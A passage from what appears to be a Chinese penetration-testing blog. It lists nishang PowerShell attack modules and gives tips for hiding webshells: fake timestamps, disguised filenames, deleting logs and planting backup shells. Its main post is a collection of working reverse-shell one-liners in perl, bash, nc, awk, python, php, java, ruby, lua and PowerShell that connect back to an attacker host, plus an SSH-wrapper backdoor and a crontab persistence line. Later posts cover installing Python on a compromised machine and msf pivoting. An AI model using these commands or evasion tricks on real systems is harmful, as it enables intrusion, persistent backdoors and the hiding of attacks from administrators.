<p>13,如果想一键使用nishang中的所有功能[powerpreter],直接导入下面的模块即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">powerpreter.psm1</div></pre></td></tr></table></figure></p>
<p>14,其它的一些辅助性的模块[Utility]<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">StringToBase64.ps1		base64编码</div><div class="line">Base64ToString.ps1 		base64解码</div><div class="line">ConvertTo-ROT13.ps1     	rot13加密</div><div class="line">Download.ps1			下载文件</div><div class="line">ExetoText.ps1			将可执行文件转换成文本</div><div class="line">TexttoExe.ps1			将可文本转换成可执行文件</div><div class="line">Invoke-Decode.ps1		解码</div><div class="line">Invoke-Encode.ps1		编码</div><div class="line">Parse_Keys.ps1			用来还原键盘记录中的内容</div><div class="line">Start-CaptureServer.ps1		抓取smb的hash</div><div class="line">Add-Persistence.ps1			加入自启动ps脚本,实现持久控制</div><div class="line">Remove-Persistence.ps1		删除自启动ps脚本</div><div class="line">Speak.ps1 			最后再说个很有趣的小教本,让对方系统播放指定的语音</div></pre></td></tr></table></figure></p>
<h4 id="一点小结"><a href="#一点小结" class="headerlink" title="一点小结:"></a>一点小结:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;不得不说,老外们的脑洞确实比我们大很多很多,虽然只是一款小工具,但带我们的思路确实无穷的,起码本人受益颇多,对于win渗透来讲,powershell无疑就是最好而且是纯天然的渗透工具,因为能直接跟系统api接触,灵活性也非常大,所以还是很值得我们花大量的时间去研究学习的</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/10/05/hidden-webshell/">
                放心种下你的webshell 之 webshell隐藏小记
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-10-05</span>
            
            
            
                <span class="category">
                    <a href="/categories/webshell-hidden/">webshell hidden</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<p>1,拿到webshell的第一件事儿,就是顺手把webshell时间属性改为和同目录其它文件相同的时间戳,一般在大马里和其它的一些webshell管理工具都提供了类似的功能</p>
<p>2,尽量放在那些程序员和管理都不会经常光顾到的目录中,比如:各种第三方工具(phpmyadmin)的一些插件目录,主题目录以及一些临时目录……</p>
<p>3,webshell所在目录的层级自然是越深越好,平时网站不出问题的话,一般四五级目录里面很少会被人注意到……</p>
<p>4,webshell的名字尽量不要太招摇,尤其是像带有shell,spy,hack,0day,love,shit……这些关键字的(我们渗透最最终的目的就是拿到自己想要的东西而很难被人发觉,不要因为自己的无知和愚蠢,而造成了一些不必要的麻烦,心态要平和低调,毕竟都不是孩子了),……,在给webshell起名字的时候尽量模仿着当前目录的一些名字特征来取,比如,我们在目标网站目录中,发现有个叫’node.tpl.php’的文件,那我们就可以模仿他取个叫’plugins.tpl.php’的名字,这样相对容易混淆视听</p>
<p>5,webshell里面尽量不要用带类似eval这种的危险特征,如果是在linux中管理员只需要awk一句话就能锁定你,除了eval,还有比如:exec,system,passthru,shell_exec,assert……这些函数都最好不要用,你可以尝试创建个自定义函数,然后调用它,函数里面可以接你的webshell参数即可,不仅能在一定程度上延长webshell的存活时间,也加大了管理的查找难度,可以暂时性躲避一些功能比较简陋的waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来想办法构造我们的webshell,关于webshell免杀,后续会专门再说,这里就先提一嘴</p>
<p>6,你也可以尝试直接把一句话函数插到目标网站脚本文件里面,当然最好是一个非常不起眼的地方,比如:函数库文件,配置文件里面等等,然后你再到另一个导该函数库的脚本文件中去调用那个一句话…</p>
<p>7,如果已经拿到服务器权限,可以把网站日志中的所有关于webshell的访问记录,渗透时造成的一些网站报错记录以及你自己的一些ip访问日志,顺手删掉或者替换都行,如果是linux那就很好办了,sed或者egrep几句话就搞定了,如果windows,嫌麻烦就清空吧,关于记录清理也是个比较大的项,后续单独说</p>
<p>8,尝试利用静态文件(比如,各类图片,css,js,html,txt文件等等)隐藏一句话,然后用.htaccess 进行解析,不这过需要目标开启重写才行,例如.htaccess实现自解析,确实比较老套了,基于.htaccess实现的变种其实还有非常多,这里就不一一说了</p>
<p>9,利用php.ini或者user.ini来解析你的webshell,想必大家已经用的比较多了,烂大街了</p>
<p>10,如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle能搜到的各种信息等等,最好先好好的读读代码,把里面的webshell箱子地址剔除掉,推荐用开源的大马,好定制,记住,我们的webshell尽量不要编码,因为编码也并不能很好的解决waf问题,你知道的,正常的脚本文件是绝对不会编码的,一旦稍微有经验的程序员或者管理看到这些东西,肯定就会被发现,还有,大马中一般都会带有pass或者password类的字符,建议把这些敏感字段全部换成别的,因为管理依然可以通过这种方式快速定位到我们的webshell</p>
<p>11,养成好习惯,为了防止权限很快丢失,最好再上传几个备用webshell到不同的目录位置,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,传上去以后确定shell正常访问就可以了,不到万不得已不用去访问它,防止留的日志太多,暴露自己</p>
<p>12,在你已经有机器权限的情况下,还可以看看管理员还有没有自己写的一些webshell监测脚本,比如一些非常可疑的硬链接</p>
<p>13,上传图片马,然后再到另一个不起眼的地方尝试去包含它,烂大街的东西了,大家再熟悉不过了</p>
<p>14,如果有可能的话,可以抽空审计下目标代码,尝试在正常的代码中利用回掉的方式构造执行自己的webshell,这种没有任何文件的后门确实比较隐蔽<br>15,脚本执行完以后进行自删除,然后直接把webshell代码驻留在内存中,当然,这种方式有个非常大的弊端,一旦目标重启web服务就废了</p>
<p>16,尝试给webshell设置一些特殊属性</p>
<p>17,更多,待续……<br><br></p>
<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;都是根据个人实际渗透中的一些经验加上站在前人的肩膀上,顺手整理的,不过,无疑中让我发现个很有意思的事情,不知道是哪位朋友拿着自己曾经的笔记,发出去了,然后现在网上转的到处都是,嘿嘿……不过没关系啦,反正我在乎的只是技术本身,除此之外的东西,不值一提,当然,基于某种思路的花样繁多的变种肯定还会有非常非常多,期待大家能一起交流,待续…</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/27/revese-shell/">
                很多时候你需要的也许只是一个shell
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-27</span>
            
            
            
                <span class="category">
                    <a href="/categories/shell/">shell</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,在实际渗透过程中想进行某些操作,我们迫切的需要一个可交互的shell,但你又不想上传工具到目标机器上,怎么办呢,希望下面的内容能对你有用,”利用目标机器上现有的环境弹回一个可交互的shell”(没错,coablt strike &amp; msf 会更方便,但今天只单纯的说reverse shell):<br><br></p>
<h5 id="首先-可以先尝试利用linux系统现有的各种环境来弹shell"><a href="#首先-可以先尝试利用linux系统现有的各种环境来弹shell" class="headerlink" title="首先,可以先尝试利用linux系统现有的各种环境来弹shell:"></a>首先,可以先尝试利用linux系统现有的各种环境来弹shell:</h5><p>1,利用perl反弹,也是个人比较推荐的方式,因为现在几乎主流的linux发行版都已经预装了perl,你会发现很多大马里面默认也都会选择使用perl<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># perl -e 'use Socket;$i="192.168.3.251";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");&#125;;'</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/perl_shell.jpg" alt=""><br><br><img src="/img/perl_shell_res.jpg" alt=""><br></p>
<p>2,利用bash自身特性来反弹,bash就不说了,现在主流linux发行版的默认shell程序<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/192.168.3.251/8080 0&gt;&amp;1  [适合redhat系列,不建议用exec,兼容性并不好]</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/bash_shell.jpg" alt=""><br><br><img src="/img/bash_shell_res.jpg" alt=""><br></p>
<p>3,利用 ssh的一些特性来反弹,可能需要允许你的ssh能以密码的(如果是证书可能就不行了)形式登录才可以<br>第一种:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8080;   </span></div><div class="line"><span class="comment"># ssh root@192.168.3.251 -p 8080 [用户名root,密码随意]</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ssh_d.jpg" alt=""><br><br><img src="/img/ssh_d_connect.jpg" alt=""><br><br><img src="/img/ssh_d_res.jpg" alt=""><br></p>
<p>第二种:[简易SSH wrapper 后门]<br>在目标机器上执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># cd /usr/sbin/</span></div><div class="line"><span class="comment"># mv sshd ../bin/</span></div><div class="line"><span class="comment"># echo '#!/usr/bin/perl' &gt;sshd</span></div><div class="line"><span class="comment"># echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd</span></div><div class="line"><span class="comment"># echo 'exec &#123;"/usr/bin/sshd"&#125; "/usr/sbin/sshd",<span class="doctag">@ARGV</span>,' &gt;&gt;sshd</span></div><div class="line"><span class="comment"># chmod u+x sshd</span></div><div class="line"><span class="comment"># /etc/init.d/sshd restart</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/sshd reverse shell.png" alt=""><br></p>
<p>在本地执行下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum install socat 如果没有socat,顺手装下即可</span></div><div class="line"><span class="comment"># socat STDIO TCP4:192.168.3.159:22,sourceport=13377</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/sshd reverse shell_res.png" alt=""><br></p>
<p>4,利用古老的nc进行反弹,在大多数linux发行版中,一般都会预装nc,但不幸的是,它只是一个阉割版的nc,默认没带-e(发送指定程序)选项,不过没关系,通过命名管道的方式你也一样可以把bash通过nc弹出去<br>第一种:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.3.251 8080 &gt;/tmp/f</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/nc_no_e.jpg" alt=""><br><br><img src="/img/nc_no_e_res.jpg" alt=""><br></p>
<p>第二种[cryptcat 加密版nc,自己可以设置连接密码]:<br><br></p>
<p>5,利用awk来反弹shell,awk本身是一个高级文本处理工具,自己的最爱,说它高级是因为它也支持一些高级语言的特性,处理起来极为方便<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># awk 'BEGIN&#123;s="/inet/tcp/0/192.168.3.251/8080";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;'</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/awk_shell.jpg" alt=""><br><br><img src="/img/awk_shell_res.jpg" alt=""><br></p>
<p>6,利用原生的telnet工具反弹shell[可能你还需要先装一下telnet,正常情况下目标机器大多数都是已经装好的]<br>第一种形式[利用纯管道的方式反弹,一个端口用于传输命令,另一个端口用于传输命令执行结果的数据]:<br>在目标机器执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># telnet 192.168.3.251 8080 | /bin/bash | telnet 192.168.3.251 1080</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/telnet_connet.jpg" alt=""><br></p>
<p>客户端务必要同时接收这两个端口的数据:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nc -lvvp 8080 [传输指令]</span></div><div class="line"><span class="comment"># nc -lvvp 1080 [传输命令结果数据]</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/telnet_res.jpg" alt=""><br></p>
<p>第二种形式:<br>在目标机器执行[创建管道文件来实施反弹,和上面的原理其实大同小异],基于mknod变种的形式其实还有很多,这里就不一一举例了,反正我们的初衷只是想要一个shell而已:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mknod test p &amp;&amp; telnet 192.168.3.251  8080 0&lt;test | /bin/bash 1&gt;test</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/telnet_mknod.jpg" alt=""><br></p>
<p>客户端机器:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nc -lvvp 8080</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/telnet_mknod_res.jpg" alt=""><br><br><br></p>
<h5 id="利用目标机器上现有的各种语言运行环境来反弹shell"><a href="#利用目标机器上现有的各种语言运行环境来反弹shell" class="headerlink" title="利用目标机器上现有的各种语言运行环境来反弹shell:"></a>利用目标机器上现有的各种语言运行环境来反弹shell:</h5><p>7,利用py进行反弹,在大多数发行版中,一般都会预装py环境,虽然只是2.6.6,但对我们来讲,足矣<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.3.251",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/py_shell.jpg" alt=""><br><br><img src="/img/py_shell_res.jpg" alt=""><br></p>
<p>8,既是py,反弹的方式也就非常多了,比如下面这种,基于py衍生出来的crontab(计划任务)反弹方法,在实际渗透过程中,如果你直接加到系统计划任务是很容被发现的,只不过,放在计划任务里面会更方便一点,暂时用下还是可以的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># (crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.3.251\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/py_crontab.jpg" alt=""><br><br><img src="/img/py_crontab_res.jpg" alt=""><br></p>
<p>9,利用php反弹,针对php的网站可以尝试,说到底还是利用php的socket函数来发起的连接<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># php -r '$sock=fsockopen("192.168.3.251",8080);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/php_shell.jpg" alt=""><br><br><img src="/img/php_shell_res.jpg" alt=""><br></p>
<p>10,如果目标是基于java开发的网站,不妨尝试下利用java来反弹,不过你可能需要事先把它打成jar包,然后再丢到目标上去执行,跨平台其实蛮好的(win也通用),另外java的免杀无疑也是非常好用<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</div><div class="line"></div><div class="line">	<span class="comment">/**</span></div><div class="line">	* <span class="doctag">@param</span> args</div><div class="line">	* <span class="doctag">@throws</span> Exception </div><div class="line">	*/</div><div class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">		<span class="comment">// TODO Auto-generated method stub</span></div><div class="line">		Runtime r = Runtime.getRuntime();</div><div class="line">		String cmd[]= &#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.3.251/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;</div><div class="line">		Process p = r.exec(cmd);</div><div class="line">		p.waitFor();</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>11,同样,利用ruby也是一样的反弹方法<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.3.251","8080");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/ruby_shell.jpg" alt=""><br><br><img src="/img/ruby_shell_res.jpg" alt=""><br></p>
<p>12,lua 反弹,实际渗透过程中遇到的很少,做游戏的可能用的比较多<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get install lua50</span></div><div class="line"><span class="comment"># apt-get install luarocks</span></div><div class="line"><span class="comment"># luarocks install luasocket</span></div><div class="line"><span class="comment"># lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.3.251','8080');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></div></pre></td></tr></table></figure></p>
<p>13,利用c 反弹shell<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nc -lvvp 8080</span></div><div class="line"><span class="comment"># ./c_reverse_shell 192.168.3.251 8080</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/cshell.jpg" alt=""><br></p>
<p>14,利用nodejs &amp; gcc 反弹shell<br><br></p>
<h5 id="基于不同协议的shell反弹方式"><a href="#基于不同协议的shell反弹方式" class="headerlink" title="基于不同协议的shell反弹方式"></a>基于不同协议的shell反弹方式</h5><p>15,在目标机器没有禁ping的情况下,我们还可以尝试利用 icmp 进行正向连接<br>不过,需要先编译下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># make linux</span></div></pre></td></tr></table></figure></p>
<p>在目标机器上执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./ishd -i 6635 -t 0 -p 8080</span></div></pre></td></tr></table></figure></p>
<p>回到客户端机器上执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./ish -i 6635 -t 0 -p 8080 192.168.3.159[这里可以是域名]</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/icmpshell.jpg" alt=""><br></p>
<p>16,利用 udp 来实现的反弹效果<br>在目标机器上执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># python udpshell.py 192.168.3.251 53 udp</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/udp_shell_rever.jpg" alt=""><br></p>
<p>回到本地执行:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nc -l -p 53 -u 这里务必要以udp模式来接收</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/udp_shell_rever_res.jpg" alt=""><br></p>
<p>17,基于dns的shell反弹,这里不说了,典型应用(cobalt strike),别着急,到时候再单聊它</p>
<p><br></p>
<h3 id="windows上的可以利用的各种shell反弹方式"><a href="#windows上的可以利用的各种shell反弹方式" class="headerlink" title="windows上的可以利用的各种shell反弹方式"></a>windows上的可以利用的各种shell反弹方式</h3><p>18,基于powershell的各种反弹(在nishang中已经提供了大量的类似功能的脚本)</p>
<p>单脚本反弹<br>先在本地机器监听:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nc -lvp 8080</span></div></pre></td></tr></table></figure></p>
<p>再想办法把 mini-reverse.ps1 和 minRev.ps1 脚本上传到目标机器,然后执行下面的语句,有乱码,把cmd的字符集调成gbk就好了,如果是目标是英文系统就不会有这种情况了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\mini-reverse.ps1'&#125;"</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/powershell_mimi_reverse_shell.jpg" alt=""><br><br><img src="/img/powershell_mimi_reverse_shell_res.jpg" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\minRev.ps1'&#125;"  显然格式化做的不太好</span></div></pre></td></tr></table></figure>
<p><img src="/img/powershell_minrev_shell.jpg" alt=""><br><br><img src="/img/powershell_minrev_shell_res.jpg" alt=""><br></p>
<p>使用powercat(nc for powershell),当然啦,关于powercat还有很多很好用的功能,如协议切换,文件传输,重放攻击,配合msf联动等等……今天这里单单只是用它来反弹一个shell即可:<br>先放开脚本执行限制<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set-ExecutionPolicy Unrestricted</div></pre></td></tr></table></figure></p>
<p>在本机先创建一个返回cmd shell的payload:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PS <span class="symbol">C:</span>\&gt; Import-Module .\powercat.ps1</div><div class="line">PS <span class="symbol">C:</span>\&gt; powercat -c <span class="number">192.168</span>.<span class="number">3.251</span> -p <span class="number">8081</span> -e cmd -g <span class="meta">&gt;&gt; </span>payload.ps1</div><div class="line"><span class="comment"># nc -lvp 8081 然后开始监听payload回连的端口</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/powershell_powercat_payload_reerse.jpg" alt=""><br></p>
<p>最后,到目标机器去上执行该payload,执行完以后,也许你会发现,提示符会一直挂在那里,不过不要紧,实际渗透中让它后台执行就好了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># powershell –exec bypass –Command "&amp; &#123;Import-Module 'C:\payload.ps1'&#125;"</span></div></pre></td></tr></table></figure></p>
<p><img src="/img/powershell_powercat_payload_reerse_res.jpg" alt=""><br><br><img src="/img/powershell_powercat_payload_reerse_res_end.jpg" alt=""><br></p>
<p>关于nishang中的各种shell反弹方式,这里就不详细说了,因为在后面还会有专门篇幅来说nishang,内容比较多,这里就先不废话了<br><br></p>
<p>19,关于其它形式的一些反弹,比如,计划任务,服务,注册表等等……内容较杂乱,后续我们抽空再细说<br><br></p>
<h5 id="其它的一些shell反弹利用方式"><a href="#其它的一些shell反弹利用方式" class="headerlink" title="其它的一些shell反弹利用方式:"></a>其它的一些shell反弹利用方式:</h5><p>20,境外的JSRat<br>21,利用winrar 0day 反弹shell<br><br><br>诸如此类的各种形式衍生……篇幅有限,这里就不细说了,脑洞放开,还会有很多,只是一个shell而已,不用过于太那啥</p>
<p><br></p>
<h5 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;反弹的核心是和目标系统建立连接(如果中间被防火墙阻断了,那你就要想办法了,尤其当你一个较低的权限在操作时,这里只是单纯的把shell弹回来,至于实际反弹过程中的各种问题,后续再说),不管你是用的系统管道也好,用各种语言提供的socket函数也好,反正最后的目的只有一个,我们只是需要一个目标系统的shell……基于现有这些思路,其实,还可以衍生出来非常多的shell反弹方式,大家只要敢开脑洞就好了,理解反弹shell的本质比直接抄来就用会好很多,其实,有时候真的并不需要自己多么多高的智商,你只需要站在前人的肩膀上,基于现有的资源条件下,不断衍生出自己的想法并加以改进实践这就足以变的强大起来,虽然,会慢人一步,但那只是暂时的,厚积薄发才能融会贯通嘛,贵在坚持,一口吃不了胖子,步子过大,容易扯着蛋,始终相信物极必反</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/26/install-py27-on-centos/">
                在目标机器上快速编译安装py2.7
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-26</span>
            
            
            
                <span class="category">
                    <a href="/categories/python/">python</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;有时迫于无奈,我们需要在目标机器上安装一些自己的工具环境,尤其是linux(默认2.6.6,有些脚本很难跑起来),因为win下的工具已经非常丰富了,这里就不说了<br><br><br>1,编译安装python2.7:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum groupinstall "Development tools" -y</span></div><div class="line"><span class="comment"># yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel -y</span></div><div class="line"><span class="comment"># wget https://www.python.org/ftp/python/2.7.11/Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># tar -xf Python-2.7.11.tgz</span></div><div class="line"><span class="comment"># # cd Python-2.7.11</span></div><div class="line"><span class="comment"># ./configure --prefix=/usr/local</span></div><div class="line"><span class="comment"># make &amp;&amp; make install</span></div><div class="line"><span class="comment"># echo $?</span></div><div class="line"><span class="comment"># python2.7</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;</span>&gt; import sys</div><div class="line"><span class="meta">&gt;&gt;</span>&gt; sys.version</div></pre></td></tr></table></figure></p>
<p>2,在安装pip之前,我们需要先编译安装好setuptools:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -xf setuptools-21.0.0.tar.gz </span></div><div class="line"><span class="comment"># cd setuptools-21.0.0</span></div><div class="line"><span class="comment"># python setup.py  install</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
<p>3,开始编译安装pip:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tar -xf pip-8.1.1.tar.gz </span></div><div class="line"><span class="comment"># cd pip-8.1.1</span></div><div class="line"><span class="comment"># python setup.py install</span></div><div class="line"><span class="comment"># echo $?</span></div></pre></td></tr></table></figure></p>
<p>4,简单测试下pip是否可用,可以随便装个库,然后用下里面的方法试试:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pip2.7 -h</span></div><div class="line"><span class="comment"># pip2.7 install requests</span></div></pre></td></tr></table></figure></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/09/25/msf-socks4a/">
                通向彼岸 之内网代理转发 [msf中的socs4a模块使用及meterpreter多级内网穿透]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-09-25</span>
            
            
            
                <span class="category">
                    <a href="/categories/scoks4a/">scoks4a</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;如果你觉得用别的socks代理工具太麻烦,不用担心,在msf中同样也为我们提供好了用于socks代理的模块[socks4a],虽然它只是基于scoks4的,但对于我们实际渗透来讲,关系并不大<br><br><br>1,首先,假设我们已经获取了目标系统的meterpreter会话,然后,我们发现在目标机器上存在内网段,这时,我们想继续对目标内网进行渗透,然后就有了下面的一些内容<br><img src="/img/ipconfig meter.jpg" alt=""><br></p>
